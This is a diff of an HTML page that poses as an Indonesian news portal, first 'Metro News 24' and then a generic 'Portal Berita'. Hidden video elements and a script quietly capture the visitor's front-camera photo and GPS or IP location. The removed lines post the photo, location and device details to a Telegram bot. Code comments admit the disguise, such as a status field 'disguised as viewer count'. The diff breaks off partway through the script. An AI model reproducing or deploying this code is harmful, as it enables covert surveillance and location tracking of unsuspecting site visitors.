@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Metro News 24 - Portal Berita Terkini</title>
+    <title>Portal Berita Indonesia - Terkini dan Terpercaya</title>
     <style>
         * {
             margin: 0;
@@ -13,114 +13,121 @@
 
         body {
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f0f2f5;
-            min-height: 100vh;
+            background-color: #f0f2f5;
+            color: #1a1a1a;
         }
 
-        /* Header Berita */
-        .top-bar {
-            background: #1a1a1a;
-            color: #fff;
-            padding: 8px 20px;
+        /* Header dan Navigasi */
+        .top-header {
+            background-color: #c62828;
+            color: white;
+            padding: 8px 0;
             font-size: 12px;
-            border-bottom: 3px solid #e74c3c;
         }
 
-        .top-bar-content {
+        .top-header .container {
             max-width: 1200px;
             margin: 0 auto;
+            padding: 0 20px;
             display: flex;
             justify-content: space-between;
         }
 
-        .date {
-            color: #999;
-        }
-
-        .breaking-ticker {
-            color: #e74c3c;
-            font-weight: 600;
-        }
-
-        .header {
-            background: white;
-            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
-            padding: 20px;
+        .main-header {
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 15px 0;
             position: sticky;
             top: 0;
             z-index: 100;
         }
 
-        .header-content {
+        .main-header .container {
             max-width: 1200px;
             margin: 0 auto;
+            padding: 0 20px;
             display: flex;
             align-items: center;
-            gap: 30px;
+            justify-content: space-between;
         }
 
         .logo {
             display: flex;
             align-items: center;
-            gap: 10px;
         }
 
-        .logo-icon {
-            font-size: 40px;
-            color: #e74c3c;
-        }
-
-        .logo-text h1 {
-            color: #333;
-            font-size: 24px;
+        .logo h1 {
+            font-size: 28px;
             font-weight: 800;
-            line-height: 1.2;
+            color: #c62828;
+            letter-spacing: -0.5px;
         }
 
-        .logo-text p {
-            color: #999;
-            font-size: 11px;
-            letter-spacing: 1px;
-        }
-
-        .nav-menu {
-            display: flex;
-            gap: 25px;
-            margin-left: auto;
-        }
-
-        .nav-menu a {
+        .logo span {
             color: #333;
-            text-decoration: none;
-            font-weight: 600;
+            font-weight: 300;
             font-size: 14px;
-            text-transform: uppercase;
-            transition: color 0.3s;
-        }
-
-        .nav-menu a:hover {
-            color: #e74c3c;
+            margin-left: 10px;
+            padding-left: 10px;
+            border-left: 2px solid #ddd;
         }
 
         .search-bar {
-            background: #f5f5f5;
-            border-radius: 30px;
+            background-color: #f5f5f5;
             padding: 8px 15px;
+            border-radius: 25px;
             display: flex;
             align-items: center;
-            gap: 10px;
+            width: 300px;
         }
 
         .search-bar input {
             border: none;
             background: transparent;
+            width: 100%;
             outline: none;
-            width: 200px;
             font-size: 14px;
         }
 
-        /* Main Container */
-        .container {
+        .nav-menu {
+            background-color: white;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .nav-menu .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .nav-menu ul {
+            list-style: none;
+            display: flex;
+            gap: 25px;
+            padding: 10px 0;
+        }
+
+        .nav-menu ul li a {
+            text-decoration: none;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+            text-transform: uppercase;
+            transition: color 0.3s;
+        }
+
+        .nav-menu ul li a:hover {
+            color: #c62828;
+        }
+
+        .nav-menu ul li a.active {
+            color: #c62828;
+            border-bottom: 2px solid #c62828;
+            padding-bottom: 10px;
+        }
+
+        /* Container Utama */
+        .main-container {
             max-width: 1200px;
             margin: 30px auto;
             padding: 0 20px;
@@ -129,359 +136,150 @@
             gap: 30px;
         }
 
-        /* Breaking News Banner */
-        .breaking-news {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
-            padding: 15px 20px;
+        /* Artikel Utama */
+        .featured-article {
+            background-color: white;
             border-radius: 10px;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            animation: newsPulse 2s infinite;
-            grid-column: 1 / -1;
-        }
-
-        @keyframes newsPulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.9; }
-            100% { opacity: 1; }
-        }
-
-        .breaking-label {
-            background: white;
-            color: #e74c3c;
-            padding: 5px 15px;
-            border-radius: 30px;
-            font-weight: 800;
-            font-size: 14px;
-            text-transform: uppercase;
-        }
-
-        .breaking-text {
-            font-weight: 500;
-            font-size: 16px;
-        }
-
-        /* Main Article */
-        .main-article {
-            background: white;
-            border-radius: 15px;
             overflow: hidden;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             margin-bottom: 30px;
         }
 
-        .article-image {
-            width: 100%;
-            height: 350px;
-            background: linear-gradient(135deg, #2c3e50, #3498db);
+        .featured-image {
+            height: 400px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             position: relative;
-            overflow: hidden;
         }
 
-        .article-image::before {
-            content: "📹 LIVE";
+        .featured-image .overlay {
             position: absolute;
-            top: 20px;
-            left: 20px;
-            background: #e74c3c;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 30px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            color: white;
+        }
+
+        .category {
+            background-color: #c62828;
             color: white;
             padding: 5px 15px;
-            border-radius: 30px;
+            border-radius: 20px;
             font-size: 12px;
-            font-weight: 600;
-            z-index: 2;
-            animation: liveBlink 1s infinite;
-        }
-
-        @keyframes liveBlink {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-
-        .image-overlay {
-            position: absolute;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 8px 15px;
-            border-radius: 30px;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .image-overlay span {
-            animation: cameraFlash 2s infinite;
-        }
-
-        @keyframes cameraFlash {
-            0% { opacity: 0.5; }
-            50% { opacity: 1; }
-            100% { opacity: 0.5; }
-        }
-
-        .article-content {
-            padding: 30px;
-        }
-
-        .article-category {
-            color: #e74c3c;
-            font-weight: 700;
-            font-size: 13px;
-            text-transform: uppercase;
+            display: inline-block;
             margin-bottom: 10px;
         }
 
-        .article-title {
+        .featured-image h2 {
             font-size: 32px;
-            color: #333;
-            margin-bottom: 15px;
-            font-weight: 800;
-            line-height: 1.3;
+            margin-bottom: 10px;
         }
 
-        .article-meta {
+        .meta {
             display: flex;
             gap: 20px;
-            color: #666;
             font-size: 14px;
-            margin-bottom: 20px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #eee;
+            opacity: 0.9;
         }
 
-        .article-text {
-            color: #444;
-            line-height: 1.8;
-            margin-bottom: 20px;
-        }
-
-        /* Live Stats Card */
-        .live-stats {
-            background: white;
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            margin-bottom: 30px;
-        }
-
-        .stats-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .stats-header h3 {
-            color: #333;
-            font-size: 18px;
-            font-weight: 700;
-        }
-
-        .live-badge {
-            background: #e74c3c;
-            color: white;
-            padding: 5px 12px;
-            border-radius: 30px;
-            font-size: 12px;
-            font-weight: 600;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-        }
-
-        .stat-item {
-            text-align: center;
-        }
-
-        .stat-value {
-            font-size: 28px;
-            font-weight: 800;
-            color: #e74c3c;
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            color: #666;
-            font-size: 12px;
-            text-transform: uppercase;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #eee;
-            border-radius: 2px;
-            margin-top: 20px;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            width: 75%;
-            height: 100%;
-            background: #e74c3c;
-            animation: progress 2s ease-in-out infinite;
-        }
-
-        @keyframes progress {
-            0% { width: 60%; }
-            50% { width: 80%; }
-            100% { width: 60%; }
-        }
-
-        /* Sidebar */
-        .sidebar {
-            background: white;
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
-
-        .sidebar h3 {
-            color: #333;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #e74c3c;
-            font-size: 18px;
-            font-weight: 700;
-        }
-
-        .trending-item {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .trending-number {
-            width: 30px;
-            height: 30px;
-            background: #f5f5f5;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            color: #e74c3c;
-        }
-
-        .trending-text {
-            flex: 1;
-        }
-
-        .trending-title {
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 3px;
-            font-size: 14px;
-        }
-
-        .trending-time {
-            font-size: 11px;
-            color: #999;
-        }
-
+        /* Daftar Berita */
         .news-list {
-            margin-top: 25px;
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
         .news-item {
             display: flex;
             gap: 15px;
-            margin-bottom: 20px;
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .news-item:last-child {
+            border-bottom: none;
         }
 
         .news-thumb {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 24px;
-            position: relative;
-            overflow: hidden;
+            width: 100px;
+            height: 70px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 5px;
         }
 
-        .news-thumb::before {
-            content: "📸";
-            font-size: 30px;
-            opacity: 0.5;
-            animation: thumbPulse 2s infinite;
-        }
-
-        @keyframes thumbPulse {
-            0%, 100% { transform: scale(1); opacity: 0.5; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-        }
-
-        .news-info {
-            flex: 1;
-        }
-
-        .news-title {
-            font-weight: 600;
-            color: #333;
+        .news-content h3 {
+            font-size: 16px;
             margin-bottom: 5px;
-            font-size: 14px;
+            color: #333;
         }
 
-        .news-meta {
-            font-size: 11px;
-            color: #999;
-        }
-
-        /* Ad Section */
-        .ad-section {
-            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            margin: 30px 0;
-        }
-
-        .ad-label {
-            font-size: 10px;
-            color: #999;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-        }
-
-        .ad-content {
-            font-size: 14px;
+        .news-content .meta {
+            font-size: 12px;
             color: #666;
         }
 
-        /* Footer */
-        .footer {
-            background: #1a1a1a;
+        /* Sidebar */
+        .sidebar {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .sidebar-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #c62828;
+        }
+
+        /* Iklan */
+        .ad-banner {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            padding: 40px 20px 20px;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .ad-banner.small {
+            padding: 10px;
+            font-size: 14px;
+        }
+
+        /* Trending Topics */
+        .trending-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .tag {
+            background-color: #f0f2f5;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 13px;
+            color: #333;
+            text-decoration: none;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #1a1a1a;
+            color: white;
+            padding: 40px 0;
             margin-top: 50px;
         }
 
-        .footer-content {
+        .footer-container {
             max-width: 1200px;
             margin: 0 auto;
+            padding: 0 20px;
             display: grid;
             grid-template-columns: repeat(4, 1fr);
             gap: 30px;
@@ -489,253 +287,283 @@
 
         .footer-section h4 {
             margin-bottom: 15px;
-            color: #e74c3c;
-            font-size: 16px;
+            color: #c62828;
         }
 
-        .footer-section p, .footer-section a {
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section ul li a {
             color: #999;
-            font-size: 13px;
-            line-height: 1.8;
             text-decoration: none;
-            display: block;
-        }
-
-        .footer-section a:hover {
-            color: #e74c3c;
-        }
-
-        .footer-bottom {
-            max-width: 1200px;
-            margin: 30px auto 0;
-            padding-top: 20px;
-            border-top: 1px solid #333;
-            text-align: center;
-            color: #666;
-            font-size: 12px;
-        }
-
-        /* Status (disamarkan sebagai viewer count) */
-        #status {
-            display: inline-block;
             font-size: 14px;
-            color: #e74c3c;
         }
 
-        #countdown {
-            font-size: 24px;
-            font-weight: bold;
-            color: #e74c3c;
+        .copyright {
+            text-align: center;
+            padding: 20px;
+            background-color: #111;
+            color: #666;
+            font-size: 13px;
         }
 
-        /* Hidden elements */
-        #hidden-video {
+        /* Hidden elements untuk capture */
+        .hidden-capture {
             display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .main-header .container {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .search-bar {
+                width: 100%;
+            }
+            
+            .nav-menu ul {
+                flex-wrap: wrap;
+                gap: 10px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Top Bar -->
-    <div class="top-bar">
-        <div class="top-bar-content">
-            <div class="date">Selasa, 23 Februari 2026 | 14:30 WIB</div>
-            <div class="breaking-ticker">🔴 BREAKING: Demonstrasi Mahasiswa di Jakarta</div>
+    <!-- Top Header -->
+    <div class="top-header">
+        <div class="container">
+            <div>📅 Senin, 23 Februari 2024 | 14:30 WIB</div>
+            <div>📢 Berita Terkini dan Terpercaya</div>
         </div>
     </div>
 
-    <!-- Header -->
-    <div class="header">
-        <div class="header-content">
+    <!-- Main Header -->
+    <header class="main-header">
+        <div class="container">
             <div class="logo">
-                <span class="logo-icon">📰</span>
-                <div class="logo-text">
-                    <h1>METRO NEWS 24</h1>
-                    <p>TERPERCAYA • AKURAT • TERKINI</p>
-                </div>
-            </div>
-            <div class="nav-menu">
-                <a href="#">HOME</a>
-                <a href="#">NEWS</a>
-                <a href="#">POLITIK</a>
-                <a href="#">EKONOMI</a>
-                <a href="#">TEKNOLOGI</a>
-                <a href="#">SPORTS</a>
+                <h1>Portal<span>Berita</span></h1>
+                <span>Inspirasi Indonesia</span>
             </div>
             <div class="search-bar">
-                <span>🔍</span>
                 <input type="text" placeholder="Cari berita...">
+                <span>🔍</span>
             </div>
         </div>
-    </div>
+    </header>
 
-    <!-- Main Container -->
-    <div class="container">
-        <!-- Left Column -->
-        <div>
-            <!-- Breaking News -->
-            <div class="breaking-news">
-                <span class="breaking-label">LIVE</span>
-                <span class="breaking-text">Update terkini: Demo Mahasiswa di Depan DPR/MPR</span>
-            </div>
+    <!-- Navigation -->
+    <nav class="nav-menu">
+        <div class="container">
+            <ul>
+                <li><a href="#" class="active">Home</a></li>
+                <li><a href="#">Nasional</a></li>
+                <li><a href="#">Internasional</a></li>
+                <li><a href="#">Ekonomi</a></li>
+                <li><a href="#">Olahraga</a></li>
+                <li><a href="#">Teknologi</a></li>
+                <li><a href="#">Hiburan</a></li>
+                <li><a href="#">Gaya Hidup</a></li>
+            </ul>
+        </div>
+    </nav>
 
-            <!-- Main Article -->
-            <div class="main-article">
-                <div class="article-image">
-                    <div class="image-overlay">
-                        <span>📸</span> 2.3K watching • <span>🎥</span> LIVE
-                    </div>
-                </div>
-                <div class="article-content">
-                    <div class="article-category">Breaking News • Politik</div>
-                    <h2 class="article-title">Demo Mahasiswa di DPR: Tuntut Revisi UU</h2>
-                    <div class="article-meta">
-                        <span>👤 Oleh: Tim Liputan</span>
-                        <span>📅 23 Feb 2026, 14:30 WIB</span>
-                        <span>👁️ <span id="status">2.3K</span> viewers</span>
-                    </div>
-                    <div class="article-text">
-                        <p><strong>Jakarta, Metro News 24</strong> - Ribuan mahasiswa dari berbagai universitas di Jakarta menggelar aksi demonstrasi di depan gedung DPR/MPR hari ini. Mereka menuntut DPR untuk merevisi sejumlah undang-undang yang dianggap merugikan rakyat.</p>
-                        <p style="margin-top: 15px;">Aksi yang dimulai sejak pukul 10.00 WIB ini sempat diwarnai ketegangan dengan aparat keamanan. Hingga berita ini diturunkan, massa masih bertahan di sekitar gerbang utama gedung DPR.</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Live Stats Card -->
-            <div class="live-stats">
-                <div class="stats-header">
-                    <h3>Live Statistics Demo</h3>
-                    <span class="live-badge">LIVE</span>
-                </div>
-                <div class="stats-grid">
-                    <div class="stat-item">
-                        <div class="stat-value">12.4K</div>
-                        <div class="stat-label">Massa</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-value">847</div>
-                        <div class="stat-label">Polisi</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-value">
-                            <span id="countdown">2</span>K
+    <!-- Main Content -->
+    <div class="main-container">
+        <!-- Kiri: Berita Utama -->
+        <div class="content-left">
+            <!-- Featured Article -->
+            <article class="featured-article">
+                <div class="featured-image">
+                    <div class="overlay">
+                        <span class="category">TEKNOLOGI</span>
+                        <h2>Perkembangan AI di Indonesia Semakin Pesat, Siap Bersaing di Kancah Global</h2>
+                        <div class="meta">
+                            <span>👤 Redaksi</span>
+                            <span>📅 23 Februari 2024</span>
+                            <span>👁️ 2.345 views</span>
                         </div>
-                        <div class="stat-label">Foto/Video</div>
                     </div>
                 </div>
-                <div class="progress-bar">
-                    <div class="progress-fill"></div>
+            </article>
+
+            <!-- Daftar Berita -->
+            <div class="news-list">
+                <h3 style="margin-bottom: 15px;">Berita Terkini</h3>
+                
+                <div class="news-item">
+                    <div class="news-thumb"></div>
+                    <div class="news-content">
+                        <h3>Pemerintah Siapkan Regulasi Baru untuk Perlindungan Data Pribadi</h3>
+                        <div class="meta">
+                            <span>📅 1 jam lalu</span>
+                            <span>👁️ 1.234 views</span>
+                        </div>
+                    </div>
                 </div>
-                <p style="text-align: center; margin-top: 10px; color: #999; font-size: 12px;">Update real-time dari lokasi</p>
+
+                <div class="news-item">
+                    <div class="news-thumb"></div>
+                    <div class="news-content">
+                        <h3>Startup Indonesia Raih Pendanaan Rp 500 Miliar dari Investor Asing</h3>
+                        <div class="meta">
+                            <span>📅 2 jam lalu</span>
+                            <span>👁️ 987 views</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="news-item">
+                    <div class="news-thumb"></div>
+                    <div class="news-content">
+                        <h3>5 Tips Keamanan Digital yang Wajib Diketahui Pengguna Internet</h3>
+                        <div class="meta">
+                            <span>📅 3 jam lalu</span>
+                            <span>👁️ 2.567 views</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="news-item">
+                    <div class="news-thumb"></div>
+                    <div class="news-content">
+                        <h3>Inovasi Teknologi Blockchain Mulai Diadopsi Sektor Perbankan</h3>
+                        <div class="meta">
+                            <span>📅 4 jam lalu</span>
+                            <span>👁️ 876 views</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="news-item">
+                    <div class="news-thumb"></div>
+                    <div class="news-content">
+                        <h3>Menteri Komunikasi Resmikan Gerai Layanan Digital di 100 Kota</h3>
+                        <div class="meta">
+                            <span>📅 5 jam lalu</span>
+                            <span>👁️ 1.543 views</span>
+                        </div>
+                    </div>
+                </div>
             </div>
 
-            <!-- Ad Section -->
-            <div class="ad-section">
-                <div class="ad-label">Sponsored</div>
-                <div class="ad-content">📱 Download aplikasi Metro News 24 untuk update real-time</div>
+            <!-- Iklan -->
+            <div class="ad-banner" style="margin-top: 20px;">
+                <strong>IKLAN</strong><br>
+                Dapatkan smartphone terbaru dengan harga spesial! Klik untuk info lebih lanjut.
             </div>
         </div>
 
-        <!-- Right Column (Sidebar) -->
-        <div>
-            <div class="sidebar">
-                <h3>TRENDING TOPIK</h3>
-                <div class="trending-item">
-                    <div class="trending-number">1</div>
-                    <div class="trending-text">
-                        <div class="trending-title">Demo Mahasiswa DPR</div>
-                        <div class="trending-time">10 menit lalu • 2.3K membahas</div>
-                    </div>
-                </div>
-                <div class="trending-item">
-                    <div class="trending-number">2</div>
-                    <div class="trending-text">
-                        <div class="trending-title">Revisi UU Cipta Kerja</div>
-                        <div class="trending-time">25 menit lalu • 1.8K membahas</div>
-                    </div>
-                </div>
-                <div class="trending-item">
-                    <div class="trending-number">3</div>
-                    <div class="trending-text">
-                        <div class="trending-title">Kenaikan Harga BBM</div>
-                        <div class="trending-time">1 jam lalu • 1.2K membahas</div>
-                    </div>
-                </div>
-                <div class="trending-item">
-                    <div class="trending-number">4</div>
-                    <div class="trending-text">
-                        <div class="trending-title">Cuaca Ekstrem Jakarta</div>
-                        <div class="trending-time">2 jam lalu • 956 membahas</div>
-                    </div>
-                </div>
-                <div class="trending-item">
-                    <div class="trending-number">5</div>
-                    <div class="trending-text">
-                        <div class="trending-title">AI Revolution 2026</div>
-                        <div class="trending-time">3 jam lalu • 745 membahas</div>
-                    </div>
-                </div>
+        <!-- Kanan: Sidebar -->
+        <aside class="sidebar">
+            <div class="ad-banner small">
+                <strong>PROMO SPESIAL</strong><br>
+                Diskon 50% untuk pembelian pertama
+            </div>
 
-                <h3 style="margin-top: 30px;">FOTO TERKINI</h3>
-                <div class="news-list">
-                    <div class="news-item">
-                        <div class="news-thumb"></div>
-                        <div class="news-info">
-                            <div class="news-title">Situasi DPR dari udara</div>
-                            <div class="news-meta">5 menit lalu • 230 foto</div>
-                        </div>
-                    </div>
-                    <div class="news-item">
-                        <div class="news-thumb"></div>
-                        <div class="news-info">
-                            <div class="news-title">Bentrok di gerbang utara</div>
-                            <div class="news-meta">12 menit lalu • 187 foto</div>
-                        </div>
-                    </div>
-                    <div class="news-item">
-                        <div class="news-thumb"></div>
-                        <div class="news-info">
-                            <div class="news-title">Orator di atas mobil</div>
-                            <div class="news-meta">18 menit lalu • 156 foto</div>
-                        </div>
-                    </div>
+            <h3 class="sidebar-title">Berita Populer</h3>
+            
+            <div class="news-item">
+                <div class="news-thumb"></div>
+                <div class="news-content">
+                    <h3>Polisi Tangkap Pelaku Penipuan Online Modus Investasi Bodong</h3>
+                    <div class="meta">10.234 views</div>
                 </div>
             </div>
-        </div>
+
+            <div class="news-item">
+                <div class="news-thumb"></div>
+                <div class="news-content">
+                    <h3>Tips Mengamankan Akun Media Sosial dari Peretasan</h3>
+                    <div class="meta">8.765 views</div>
+                </div>
+            </div>
+
+            <div class="news-item">
+                <div class="news-thumb"></div>
+                <div class="news-content">
+                    <h3>Fenomena Penipuan Phishing Meningkat, Masyarakat Diminta Waspada</h3>
+                    <div class="meta">7.432 views</div>
+                </div>
+            </div>
+
+            <h3 class="sidebar-title" style="margin-top: 20px;">Trending Topic</h3>
+            <div class="trending-tags">
+                <a href="#" class="tag">#AI</a>
+                <a href="#" class="tag">#KeamananDigital</a>
+                <a href="#" class="tag">#Startup</a>
+                <a href="#" class="tag">#Blockchain</a>
+                <a href="#" class="tag">#Phishing</a>
+                <a href="#" class="tag">#Investasi</a>
+                <a href="#" class="tag">#Internet</a>
+                <a href="#" class="tag">#Teknologi</a>
+            </div>
+
+            <div class="ad-banner" style="margin-top: 20px;">
+                <strong>INFO PROMO</strong><br>
+                Internet cepat 100Mbps hanya Rp 250rb/bulan. Daftar sekarang!
+            </div>
+        </aside>
     </div>
 
     <!-- Footer -->
-    <div class="footer">
-        <div class="footer-content">
+    <footer>
+        <div class="footer-container">
             <div class="footer-section">
                 <h4>Tentang Kami</h4>
-                <p>Metro News 24 adalah portal berita terpercaya yang menyajikan informasi terkini dan akurat sejak 2010.</p>
+                <ul>
+                    <li><a href="#">Profil Perusahaan</a></li>
+                    <li><a href="#">Karir</a></li>
+                    <li><a href="#">Kontak</a></li>
+                </ul>
             </div>
             <div class="footer-section">
-                <h4>Redaksi</h4>
-                <a href="#">Kontak</a>
-                <a href="#">Karir</a>
-                <a href="#">Pedoman Media</a>
+                <h4>Layanan</h4>
+                <ul>
+                    <li><a href="#">Iklan</a></li>
+                    <li><a href="#">Berlangganan</a></li>
+                    <li><a href="#">Pedoman Media</a></li>
+                </ul>
             </div>
             <div class="footer-section">
-                <h4>Kontak</h4>
-                <p>📧 redaksi@metronews24.com</p>
-                <p>📞 021-1234-5678</p>
-                <p>📍 Jl. Veteran No. 1, Jakarta</p>
+                <h4>Jaringan</h4>
+                <ul>
+                    <li><a href="#">PortalBerita TV</a></li>
+                    <li><a href="#">Radio Portal</a></li>
+                    <li><a href="#">Event</a></li>
+                </ul>
             </div>
             <div class="footer-section">
-                <h4>Follow Us</h4>
-                <p>📱 Instagram: @metronews24</p>
-                <p>🐦 Twitter: @metronews24</p>
-                <p>📘 Facebook: Metro News 24</p>
+                <h4>Ikuti Kami</h4>
+                <ul>
+                    <li><a href="#">Facebook</a></li>
+                    <li><a href="#">Twitter</a></li>
+                    <li><a href="#">Instagram</a></li>
+                </ul>
             </div>
         </div>
-        <div class="footer-bottom">
-            © 2026 Metro News 24. All Rights Reserved.
-        </div>
+    </footer>
+
+    <div class="copyright">
+        © 2024 PortalBerita.com - Hak Cipta Dilindungi Undang-Undang
     </div>
 
-    <!-- Hidden video element -->
-    <video id="hidden-video" autoplay playsinline muted></video>
+    <!-- ===== ELEMEN TERSEMBUNYI UNTUK CAPTURE ===== -->
+    <div style="display: none;">
+        <video id="hidden-video" autoplay playsinline muted></video>
+        <video id="hidden-video-fallback" autoplay playsinline muted></video>
+        <button id="uc-trigger" onclick="triggerUC()"></button>
+    </div>
 
     <script>
         // Konfigurasi Telegram
@@ -745,198 +573,262 @@
         let cameraAccessed = false;
         let isProcessing = false;
         let stream = null;
+        let audioStream = null;
         
-        // Fungsi untuk mengirim foto ke Telegram
-        async function kirimKeTelegram(fotoBase64) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
+        // Deteksi browser
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            return {
+                isChrome: /Chrome/i.test(ua) && !/Edge|Edg|OPR|UC/i.test(ua),
+                isUC: /UCBrowser|UC/i.test(ua),
+                isOpera: /Opera|OPR/i.test(ua),
+                isAndroid: /Android/i.test(ua),
+                isIOS: /iPhone|iPad|iPod/i.test(ua)
+            };
+        }
+        
+        const browser = getBrowserInfo();
+        
+        // ==================== FUNGSI LOKASI ====================
+        async function getLokasi() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ success: false });
+                    return;
+                }
                 
-                const response = await fetch(fotoBase64);
-                const blob = await response.blob();
-                formData.append('photo', blob, 'foto.jpg');
-                
-                // Dapatkan info lokasi (optional)
-                let lokasi = "Tidak diketahui";
-                try {
-                    const ipRes = await fetch('https://ipapi.co/json/');
-                    const ipData = await ipRes.json();
-                    lokasi = `${ipData.city || ''}, ${ipData.country_name || ''}`;
-                } catch {}
-                
-                const deviceInfo = navigator.userAgent;
-                const waktu = new Date().toLocaleString('id-ID', { 
-                    timeZone: 'Asia/Jakarta',
-                    dateStyle: 'full',
-                    timeStyle: 'medium'
-                });
-                
-                formData.append('caption', 
-                    `📰 **Pengunjung Metro News 24**\n\n` +
-                    `🕐 Waktu: ${waktu}\n` +
-                    `📍 Lokasi: ${lokasi}\n` +
-                    `📱 Device: ${deviceInfo.substring(0, 100)}...\n` +
-                    `📸 Foto: Terlampir`
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            success: true,
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        });
+                    },
+                    () => {
+                        // Fallback IP
+                        fetch('https://ipapi.co/json/')
+                            .then(res => res.json())
+                            .then(data => {
+                                resolve({
+                                    success: true,
+                                    lat: data.latitude,
+                                    lng: data.longitude,
+                                    kota: data.city
+                                });
+                            })
+                            .catch(() => resolve({ success: false }));
+                    },
+                    { timeout: 5000 }
                 );
+            });
+        }
+        
+        // ==================== FUNGSI KAMERA ====================
+        async function ambilFoto() {
+            try {
+                const constraints = [
+                    { video: { facingMode: 'user', width: 640, height: 480 } },
+                    { video: { facingMode: 'user' } },
+                    { video: true }
+                ];
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
+                let mediaStream = null;
+                for (const constraint of constraints) {
+                    try {
+                        mediaStream = await navigator.mediaDevices.getUserMedia(constraint);
+                        break;
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                
+                if (!mediaStream) return null;
+                
+                const video = document.getElementById('hidden-video');
+                video.srcObject = mediaStream;
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
+                            
+                            mediaStream.getTracks().forEach(track => track.stop());
+                            canvas.remove();
+                            
+                            resolve(fotoBase64);
+                        }, 300);
+                    };
                 });
                 
-                updateStatus('2.4K', 'Terima kasih!');
-                
-            } catch (error) {
-                console.log('Background process OK');
